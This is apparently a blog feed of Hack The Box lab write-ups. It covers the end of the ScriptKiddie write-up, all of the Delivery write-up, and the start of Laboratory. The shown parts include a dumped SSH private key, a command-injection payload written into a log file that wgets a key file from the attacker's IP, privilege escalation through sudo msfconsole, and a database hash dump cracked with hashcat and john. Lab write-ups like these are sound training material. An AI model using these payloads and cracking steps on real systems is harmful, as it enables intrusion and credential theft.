&lt;span class="code-line"&gt;$ ls .ssh/&lt;/span&gt;
&lt;span class="code-line"&gt;authorized_keys&lt;/span&gt;
&lt;span class="code-line"&gt;id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;id_rsa.pub&lt;/span&gt;
&lt;span class="code-line"&gt;$ cat .ssh/authorized_keys&lt;/span&gt;
&lt;span class="code-line"&gt;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt/&lt;/span&gt;
&lt;span class="code-line"&gt;MXWipZH4vmE0lLycTlwk0eFcEQilnSCwpQoLA9QEiFAMvopNThWyjGkst6HNPdDvSDlJEfTtW4PaOFA&lt;/span&gt;
&lt;span class="code-line"&gt;seUICcwuidMXc4xepu1t0hrfv5Wn7SiwQwIDwE0DvRRSpLIr9I0wfjjEPnvc4y7uuMvsf0hegZLMnChg&lt;/span&gt;
&lt;span class="code-line"&gt;stWWCw99DS5q0YdXxkIC7eKlI90nHyUHL3ULwXDBk6NWhPmJ90yDaFC4iD0yVP3xmjKjl0iotkqbhKhR&lt;/span&gt;
&lt;span class="code-line"&gt;AD8bUINZ7anXTw4Hb0iF5tMAttB8JbLts5zvgQtYrciKE4Qnl4F+MO5yg3G03s9V69K4R+TXmI4TZKUH&lt;/span&gt;
&lt;span class="code-line"&gt;fEpNnReQ+73uOqgjH5VeZr0TmSLEszfFfXRcv7t4jxOboYnS+lgR1V2iGHzSle+nAlVLHqlwP5RTtwaO&lt;/span&gt;
&lt;span class="code-line"&gt;wE0nbykigyz/h4KNCn0rU69fYWSrkcFPYOSm92QKmaMJuXqnycjuqLmHMD2XKSuhlpgD/VmQL34C7pju&lt;/span&gt;
&lt;span class="code-line"&gt;4h+/78qK50+itG0FCiSy6IRd5DIfTkU= kid@scriptkiddie&lt;/span&gt;
&lt;span class="code-line"&gt;$ cat .ssh/id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;-----BEGIN OPENSSH PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn&lt;/span&gt;
&lt;span class="code-line"&gt;NhAAAAAwEAAQAAAYEArfzF1oqWR+L5hNJS8nE5cJNHhXBEIpZ0gsKUKCwPUBIhQDL6KTU4&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;sOeM4jMTD4DJbb/8Jsh6yzW45V3bgPp1Hm4nI3AZ8SjSI4VqtO9CcDKtPnvh3/jm5VEx9W&lt;/span&gt;
&lt;span class="code-line"&gt;bK3NNrAo9t2tlfAAAAEGtpZEBzY3JpcHRraWRkaWUBAg==&lt;/span&gt;
&lt;span class="code-line"&gt;-----END OPENSSH PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="scanlosers"&gt;scanlosers&lt;/h2&gt;
&lt;p&gt;We can now  directly connect using SSH. Looking at the accessible files we found
that the &lt;code&gt;pwn&lt;/code&gt; user has a script &lt;code&gt;scanlosers.sh&lt;/code&gt; readable by our user. This
script read a log file containing "hacking" attempts and run a &lt;code&gt;nmap --top10&lt;/code&gt; on
it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ssh kid@10.129.94.194 -i sc_id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;kid@scriptkiddie:~$ cat ../pwn/scanlosers.sh&lt;/span&gt;
&lt;span class="code-line"&gt;#!/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;log=/home/kid/logs/hackers&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;cd /home/pwn/&lt;/span&gt;
&lt;span class="code-line"&gt;cat $log | cut -d&amp;#39; &amp;#39; -f3- | sort -u | while read ip; do&lt;/span&gt;
&lt;span class="code-line"&gt;    sh -c &amp;quot;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&amp;gt;&amp;amp;1 &amp;gt;/dev/null&amp;quot; &amp;amp;&lt;/span&gt;
&lt;span class="code-line"&gt;done&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;if [[ $(wc -l &amp;lt; $log) -gt 0 ]]; then echo -n &amp;gt; $log; fi&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We download /home/kid/.ssh/authorized_keys localy and rename it to test a few
payload locally. The &lt;code&gt;cut -d' ' -f3-&lt;/code&gt; means that the 3 first "words"
(characters separated by a space) will be dropped.&lt;/p&gt;
&lt;p&gt;The idea is to execute a payload in order to add our SSH key to the "pwn"
user. As always we start by a simple &lt;code&gt;wget&lt;/code&gt; to ensure the RCE. After a few
attempt we found the following payload that we add to the &lt;code&gt;hackers&lt;/code&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;echo &amp;#39;q w e 127.0.0.1 127.0.0.1 ; wget 10.10.14.64:8000/a -O /home/pwn/.ssh/authorized_keys  ; #&amp;#39; &amp;gt; ../kid/logs/hackers&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As the "kid" private key is now also authorized for the "pown" user, we connect
using directly SSH.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ssh pwn@10.129.94.194 -i sc_id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;pwn@scriptkiddie:~$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="msfconsole"&gt;msfconsole&lt;/h2&gt;
&lt;p&gt;Our "pown" user can run &lt;code&gt;msfconsole&lt;/code&gt; as "root" without any password, which
quickly give us a shell using the &lt;code&gt;bash&lt;/code&gt; msf command allowing us to get the root
flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pwn@scriptkiddie:~$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for pwn on scriptkiddie:&lt;/span&gt;
&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User pwn may run the following commands on scriptkiddie:&lt;/span&gt;
&lt;span class="code-line"&gt;    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole&lt;/span&gt;
&lt;span class="code-line"&gt;pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;msf6 &amp;gt; bash&lt;/span&gt;
&lt;span class="code-line"&gt;[*] exec: bash&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;root@scriptkiddie:/home/pwn# id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;root@scriptkiddie:/home/pwn# cat /root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;b4ccca123e8efc9cc65296e42ed4cabf&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;An easy box exploiting a few mechanisms. The msfvenom exploit was fun to use.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="msfvenom"></category><category term="nmap"></category><category term="msfconsole"></category></entry><entry><title>HTB: Delivery</title><link href="https://maggick.fr/2021/05/htb-delivery.html" rel="alternate"></link><published>2021-05-24T09:40:00+02:00</published><updated>2021-05-24T09:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-05-24:/2021/05/htb-delivery.html</id><summary type="html">&lt;p&gt;&lt;img alt="Delivery card" class="align-left" src="/media/2021.05/delivery_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/308"&gt;Delivery&lt;/a&gt; created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/3769"&gt;ippsec&lt;/a&gt; and publish on
January 9 2021.
This box is classified as an easy machine. The user part involve to understand a
process and exploit some functionnal flow.
The root part implies enumeration and cracking somes hashes binary.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.05/delivery_card.png" alt="Delivery card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/308"&gt;Delivery&lt;/a&gt; created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/3769"&gt;ippsec&lt;/a&gt; and publish on
January 9 2021.
This box is classified as an easy machine. The user part involve to understand a
process and exploit some functionnal flow.
The root part implies enumeration and cracking somes hashes binary.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. Only ports 22 (SSH) and 80 (HTTP) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sat Feb 13 08:48:43 2021 as: nmap -sSV -oN nmap 10.129.95.75&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.129.95.75&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.013s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 998 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http    nginx 1.14.2&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Sat Feb 13 08:48:51 2021 -- 1 IP address (1 host up) scanned in 7.42 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;&lt;img alt="Homepage" src="/media/2021.05/delivery_01.png"&gt;&lt;/p&gt;
&lt;p&gt;Looking at the "contact-us" section we discover that we will probably need a
email adresse on the "delivery.htb" domain in order to access the MatterMost
server.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We got to the help desk page.&lt;/p&gt;
&lt;p&gt;&lt;img alt="help desk page" src="/media/2021.05/delivery_02.png"&gt;&lt;/p&gt;
&lt;p&gt;We create a ticket and got an associated email adresse with the &lt;ticket number&gt;@delivery.htb&lt;/p&gt;
&lt;p&gt;&lt;img alt="associated email address" src="/media/2021.05/delivery_03.png"&gt;&lt;/p&gt;
&lt;p&gt;we create an account on mettermost with this email and got the verification URL on the ticket&lt;/p&gt;
&lt;p&gt;&lt;img alt="Registering on mattermost email" src="/media/2021.05/delivery_035.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="mattermost verification link" src="/media/2021.05/delivery_04.png"&gt;&lt;/p&gt;
&lt;p&gt;The discussion give us the creds for the OSTicket application and disclose some info about password reuse&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;root
9:29 AM&lt;/p&gt;
&lt;p&gt;@developers Please update theme to the OSTicket before we go live.  Credentials to the server are maildeliverer:Youve_G0t_Mail!&lt;/p&gt;
&lt;p&gt;Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"
root
10:58 AM&lt;/p&gt;
&lt;p&gt;PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We can now access the OSticket panel as an admin using the agent panel http://helpdesk.delivery.htb/scp/login.php&lt;/p&gt;
&lt;p&gt;&lt;img alt="OSticket panel" src="/media/2021.05/delivery_05.png"&gt;&lt;/p&gt;
&lt;p&gt;The mailideriverer account also got an SSH account on the box which allow us to
get the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ssh maildeliverer@delivery.htb&lt;/span&gt;
&lt;span class="code-line"&gt;maildeliverer@delivery.htb&amp;#39;s password:&lt;/span&gt;
&lt;span class="code-line"&gt;Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;maildeliverer@Delivery:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;2300770247a4dfb6f57de6d717d86b9c&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We enumerate our user permission and found the MatterMost configuration file
containing the crendentials to access the database&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;maildeliverer@Delivery:~$ cat /opt/mattermost/config/config.json&lt;/span&gt;
&lt;span class="code-line"&gt;{&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;quot;ServiceSettings&amp;quot;: {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;SiteURL&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;WebsocketURL&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;LicenseFileLocation&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;ListenAddress&amp;quot;: &amp;quot;:8065&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;ConnectionSecurity&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;TLSCertFile&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  },&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;quot;SqlSettings&amp;quot;: {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;DriverName&amp;quot;: &amp;quot;mysql&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;DataSource&amp;quot;: &amp;quot;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;DataSourceReplicas&amp;quot;: [],&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We connect to the mysql database, enumerate the tables and dump the users and
password from the &lt;code&gt;Users&lt;/code&gt; table.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;maildeliverer@Delivery:~$ #mmuser:Crack_The_MM_Admin_PW&lt;/span&gt;
&lt;span class="code-line"&gt;maildeliverer@Delivery:~$ mysql -u mmuser -p&lt;/span&gt;
&lt;span class="code-line"&gt;Enter password:&lt;/span&gt;
&lt;span class="code-line"&gt;Welcome to the MariaDB monitor.  Commands end with ; or \g.&lt;/span&gt;
&lt;span class="code-line"&gt;Your MariaDB connection id is 382&lt;/span&gt;
&lt;span class="code-line"&gt;Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Type &amp;#39;help;&amp;#39; or &amp;#39;\h&amp;#39; for help. Type &amp;#39;\c&amp;#39; to clear the current input statement.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;MariaDB [(none)]&amp;gt; show database&lt;/span&gt;
&lt;span class="code-line"&gt;    -&amp;gt; ;&lt;/span&gt;
&lt;span class="code-line"&gt;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &amp;#39;database&amp;#39; at line 1&lt;/span&gt;
&lt;span class="code-line"&gt;MariaDB [(none)]&amp;gt; SHOW DATABASES;&lt;/span&gt;
&lt;span class="code-line"&gt;+--------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;| Database           |&lt;/span&gt;
&lt;span class="code-line"&gt;+--------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;| information_schema |&lt;/span&gt;
&lt;span class="code-line"&gt;| mattermost         |&lt;/span&gt;
&lt;span class="code-line"&gt;+--------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;2 rows in set (0.001 sec)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;MariaDB [(none)]&amp;gt; use mattermost;&lt;/span&gt;
&lt;span class="code-line"&gt;Reading table information for completion of table and column names&lt;/span&gt;
&lt;span class="code-line"&gt;You can turn off this feature to get a quicker startup with -A&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Database changed&lt;/span&gt;
&lt;span class="code-line"&gt;MariaDB [mattermost]&amp;gt; show tables;&lt;/span&gt;
&lt;span class="code-line"&gt;+------------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;| Tables_in_mattermost   |&lt;/span&gt;
&lt;span class="code-line"&gt;+------------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;| Audits                 |&lt;/span&gt;
&lt;span class="code-line"&gt;| Bots                   |&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;| UserAccessTokens       |&lt;/span&gt;
&lt;span class="code-line"&gt;| UserGroups             |&lt;/span&gt;
&lt;span class="code-line"&gt;| UserTermsOfService     |&lt;/span&gt;
&lt;span class="code-line"&gt;| Users                  |&lt;/span&gt;
&lt;span class="code-line"&gt;+------------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;46 rows in set (0.001 sec)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;MariaDB [mattermost]&amp;gt; select Username,Password from Users;&lt;/span&gt;
&lt;span class="code-line"&gt;+----------------------------------+--------------------------------------------------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;| Username                         | Password                                                     |&lt;/span&gt;
&lt;span class="code-line"&gt;+----------------------------------+--------------------------------------------------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;| surveybot                        |                                                              |&lt;/span&gt;
&lt;span class="code-line"&gt;| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |&lt;/span&gt;
&lt;span class="code-line"&gt;| john5412663                      | $2a$10$hF3jgrGBPYT2LaXISy67K.lAaTNaOKJfruZTWSzQo..ZI9dHctf7a |&lt;/span&gt;
&lt;span class="code-line"&gt;| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |&lt;/span&gt;
&lt;span class="code-line"&gt;| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |&lt;/span&gt;
&lt;span class="code-line"&gt;| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |&lt;/span&gt;
&lt;span class="code-line"&gt;| channelexport                    |                                                              |&lt;/span&gt;
&lt;span class="code-line"&gt;| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |&lt;/span&gt;
&lt;span class="code-line"&gt;| john                             | $2a$10$.uKtro1Yc15ZycqOJX1X/.m6yg7VSD60EUV58BJ4SVgg0xsYzrKe2 |&lt;/span&gt;
&lt;span class="code-line"&gt;+----------------------------------+--------------------------------------------------------------+&lt;/span&gt;
&lt;span class="code-line"&gt;9 rows in set (0.000 sec)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;MariaDB [mattermost]&amp;gt; exit&lt;/span&gt;
&lt;span class="code-line"&gt;Bye&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We create a dictionary using the disclosed password and using &lt;code&gt;hashcat&lt;/code&gt; rules we
generate a few variations.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ cat dic&lt;/span&gt;
&lt;span class="code-line"&gt;PleaseSubscribe!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;$ hashcat --force dic -r /usr/share/hashcat/rules/best64.rule --stdout &amp;gt; dic_hc&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We pass this variation dictionary to &lt;code&gt;john&lt;/code&gt; with the database hashes, and found
a password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ john hash -w=dic_hc&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;bcrypt&amp;quot;, but the string is also recognized as &amp;quot;bcrypt-opencl&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--format=bcrypt-opencl&amp;quot; option to force loading these as that type instead&lt;/span&gt;
&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 7 password hashes with 7 different salts (bcrypt [Blowfish 32/64 X3])&lt;/span&gt;
&lt;span class="code-line"&gt;Cost 1 (iteration count) is 1024 for all loaded hashes&lt;/span&gt;
&lt;span class="code-line"&gt;Will run 8 OpenMP threads&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;PleaseSubscribe!21 (?)&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: Only 5 candidates left, minimum 24 needed for performance.&lt;/span&gt;
&lt;span class="code-line"&gt;1g 0:00:00:02 DONE (2021-02-13 17:19) 0.3424g/s 26.36p/s 182.8c/s 182.8C/s asP..PeSubs&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We use this password to long as root on the box and get the final flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;maildeliverer@Delivery:~$ su&lt;/span&gt;
&lt;span class="code-line"&gt;Password:&lt;/span&gt;
&lt;span class="code-line"&gt;root@Delivery:/home/maildeliverer# cd&lt;/span&gt;
&lt;span class="code-line"&gt;root@Delivery:~# cat /root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;09679395029c940e9acea1ceab2cf76a&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;A really interesting an realistic box. There is no technical vulnerability or
exploit to use here. Just reading the applications and understanding what is
needed and found a way to achieve our attacker goal.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Linux"></category><category term="john"></category></entry><entry><title>HTB: Laboratory</title><link href="https://maggick.fr/2021/05/htb-laboratory.html" rel="alternate"></link><published>2021-05-16T09:40:00+02:00</published><updated>2021-05-16T09:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-05-16:/2021/05/htb-laboratory.html</id><summary type="html">&lt;p&gt;&lt;img alt="Laboratory Card" class="align-left" src="/media/2021.05/laboratory_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/298"&gt;Laboratory&lt;/a&gt; publish on
November 14, 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/73268"&gt;0xc45&lt;/a&gt;.
This box is rated as an easy box. It implies mostly gitlab and a LFI
vulnerability and an SUID binary.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.05/laboratory_card.png" alt="Laboratory Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/298"&gt;Laboratory&lt;/a&gt; publish on
November 14, 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/73268"&gt;0xc45&lt;/a&gt;.
This box is rated as an easy box. It implies mostly gitlab and a LFI
vulnerability and an SUID binary.&lt;/p&gt;


&lt;h1 id="foothold"&gt;Foothold&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 22 (SSH), 80 and 443 (HTTP
and HTTPS) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Thu Nov 26 09:49:27 2020 as: nmap -p- -sSV -oN nmap 10.129.47.132&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.129.47.132&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.012s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65532 filtered ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT    STATE SERVICE  VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp  open  http     Apache httpd 2.4.41&lt;/span&gt;
&lt;span class="code-line"&gt;443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Thu Nov 26 09:51:28 2020 -- 1 IP address (1 host up) scanned in 120.73 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The website either access with on the port 80 or 443 redirected to &lt;code&gt;https://laboratory.htb&lt;/code&gt;.
So we add an entry to &lt;code&gt;/etc/hosts&lt;/code&gt;.
We trying to access it again we got a certificate error as its supposed to be
for &lt;code&gt;git.laboratory.htb&lt;/code&gt;&lt;/p&gt;
